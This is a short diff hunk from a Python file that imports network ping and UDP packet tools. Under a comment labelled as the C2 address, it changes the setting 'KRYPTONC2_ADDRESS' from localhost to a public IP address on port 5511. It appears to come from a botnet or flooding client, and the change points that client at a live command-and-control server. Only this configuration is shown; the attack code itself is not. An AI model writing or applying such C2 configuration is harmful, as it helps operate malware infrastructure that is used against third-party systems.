@@ -10,7 +10,7 @@ from uuid import UUID, uuid4
 from icmplib import ping as pig
 from scapy.layers.inet import UDP    
 # IP AND PORT C2 ------------------->
-KRYPTONC2_ADDRESS  = "localhost"
+KRYPTONC2_ADDRESS  = "93.118.34.159"
 KRYPTONC2_PORT     = 5511
 
 
